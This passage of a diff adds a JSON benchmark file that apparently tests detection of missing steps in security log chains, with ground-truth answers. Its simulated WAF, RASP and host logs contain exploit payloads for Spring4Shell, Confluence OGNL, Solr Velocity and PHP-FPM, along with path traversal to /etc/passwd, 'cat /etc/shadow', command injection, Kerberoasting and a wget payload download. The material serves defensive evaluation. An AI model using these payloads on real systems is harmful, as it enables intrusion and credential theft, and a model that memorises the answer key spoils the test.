+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（env）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1002": {
+   "unit": 1002,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Spring4Shell CVE-2022-22965（class.module.classLoader 属性链写 JSP webshell）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/submit）",
+     "n_lines": 2,
+     "lines": [
+      "/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N",
+      "/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-spring-27.ops-corp.com/submit {\"property\": \"classLoader.first\"} Mozilla/5.0 (Windows NT 11.0; Win6"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（whoami）",
+     "n_lines": 1,
+     "lines": [
+      "whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== /usr/local/tomcat/bin/catalina.sh"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（whoami）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1052": {
+   "unit": 1052,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Go 应用参数注入（exec.Command 拼接 shell 元字符）",
+   "source_sequence": [
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-go-27.ops-corp.com/api/v1/convert {\"cmd_inject\": \"|id\", \"lang\": \"go\"} Mozilla/5.0 (X11; Linux x86_"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cat）",
+     "n_lines": 1,
+     "lines": [
+      "cat /etc/hosts /bin/cat cat /etc/hosts <== /bin/sh -c 'cat /etc/hosts' <== /opt/app/apiserver"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cat）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cat）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1011": {
+   "unit": 1011,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "PHP 双编码路径穿越（%252e%252e 形态读 /etc/passwd）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/index.php）",
+     "n_lines": 2,
+     "lines": [
+      "/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A",
+      "/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-44.ops-corp.com/index.php {\"path_traversal\": \"%252e%252e%252f\"} Mozilla/5.0 (X11; Linux x86_64"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cat）",
+     "n_lines": 1,
+     "lines": [
+      "cat /etc/shadow /usr/bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== php-fpm: pool www"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1103": {
+   "unit": 1103,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Kerberoasting（setspn 枚举 SPN + Rubeus kerberoast 导出票据）",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（setspn）",
+     "n_lines": 1,
+     "lines": [
+      "setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\\jdoe"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（Rubeus.exe）",
+     "n_lines": 1,
+     "lines": [
+      "Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\\jdoe"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（Rubeus.exe）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（Rubeus.exe）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（Rubeus.exe）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（Rubeus.exe）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1043": {
+   "unit": 1043,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Windows 服务持久化（sc create binPath 指向 C:\\Windows\\Temp 载荷）",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（sc）",
+     "n_lines": 1,
+     "lines": [
+      "sc create SmSvc binPath= C:\\Windows\\Temp\\svc.exe start= auto sc.exe cmd.exe /c sc create SmSvc binPath= C:\\Win"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（sc）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（sc）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（sc）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（sc）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1009": {
+   "unit": 1009,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Apache Solr Velocity 模板 RCE CVE-2019-17558（wt=velocity）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/solr/core1/select）",
+     "n_lines": 2,
+     "lines": [
+      "/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;",
+      "/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-63.ops-corp.com/solr/core1/select {\"template\": \"velocity\"} Mozilla/5.0 (Windows NT 10.0; Win6"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（sh）",
+     "n_lines": 1,
+     "lines": [
+      "sh /tmp/.v <== /bin/sh -c 'sh /tmp/.v' <== /usr/bin/java -jar /opt/solr/server/start.jar"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（sh）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1004": {
+   "unit": 1004,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Confluence OGNL 注入 CVE-2022-26134（doenterpagevariables.action）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/pages/doenterpagevariables.action）",
+     "n_lines": 2,
+     "lines": [
+      "/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh",
+      "/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-88.ops-corp.com/pages/doenterpagevariables.action {\"ognl\": \"exec\"} Mozilla/5.0 (Macintosh; In"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id）",
+     "n_lines": 1,
+     "lines": [
+      "id /usr/bin/id id <== /bin/sh -c 'id' <== /opt/atlassian/confluence/bin/catalina.sh"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（id）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1053": {
+   "unit": 1053,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "API 网关直连命令注入（边缘 WAF 命中、无 web 访问日志）",
+   "source_sequence": [
+    "waf",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf"
+     ],
+     "label": "Web 入口（/api/v2/proxy/exec）",
+     "n_lines": 1,
+     "lines": [
+      "/api/v2/proxy/exec ip=10.20.3.14;id;cat /etc/hostname Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-go-64.ops-corp.com/api/v2/proxy/exec {\"cmd_inject\": \";id;cat /etc/hostname\", \"gw\": true} Mozilla/5"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（curl）",
+     "n_lines": 1,
+     "lines": [
+      "curl -sS http://10.20.6.88:8080/api/v1/users /usr/bin/curl curl -sS <== /bin/sh -c 'curl' <== api-gw"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（curl）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1012": {
+   "unit": 1012,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "PHP-FPM CVE-2019-11043（PATH_INFO 换行注入 auto_prepend_file）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/index.php）",
+     "n_lines": 2,
+     "lines": [
+      "/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In",
+      "/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-118.ops-corp.com/index.php {\"fpm_newline\": \"auto_prepend\"} Mozilla/5.0 (Macintosh; Intel Mac O"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（wget）",
+     "n_lines": 1,
+     "lines": [
+      "wget -qO /tmp/.f 10.20.5.77/f <== /bin/sh -c 'wget -qO /tmp/.f 10.20.5.77/f' <== php-fpm: pool www"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
